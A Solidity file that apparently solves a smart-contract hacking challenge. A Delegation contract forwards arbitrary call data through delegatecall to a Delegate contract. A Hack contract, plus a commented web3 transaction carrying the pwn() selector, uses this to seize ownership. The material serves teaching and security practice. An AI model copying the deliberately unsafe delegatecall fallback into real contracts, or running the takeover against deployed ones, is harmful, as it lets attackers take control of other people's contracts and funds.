// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

contract Delegate {

  address public owner;

  constructor(address _owner) {
    owner = _owner;
  }

  function pwn() public {
    owner = msg.sender;
  }
}

contract Delegation {

  address public owner;
  Delegate delegate;

  constructor(address _delegateAddress) {
    delegate = Delegate(_delegateAddress);
    owner = msg.sender;
  }

function getSender() public view returns(address) {
    return msg.sender;
  }

  fallback() external {
    (bool result,) = address(delegate).delegatecall(msg.data);
    if (result) {
      this;
    }
  }
}


interface DelegationI { 
  function owner() external view returns(address);
  function pwn() external;
}

contract Hack  {
   
    DelegationI external_contract;

    constructor(address _delegateAddress){
        external_contract = DelegationI(_delegateAddress);
    }

    function getOwner() public view returns(address) {
        return external_contract.owner();
    }

    function getData() public pure returns(bytes memory) {
        return abi.encodeWithSignature("pwn()");
    }

    /**
    await sendTransaction({
      from: (await web3.eth.getAccounts())[0],
      to: contract.address,
      data: "0xdd365b8b0000000000000000000000000000000000000000000000000000000000000000"
    });
    **/
    function hack() public {
      (bool success,) = address(external_contract).call(abi.encodeWithSignature("pwn()"));
      require(success);
    }

}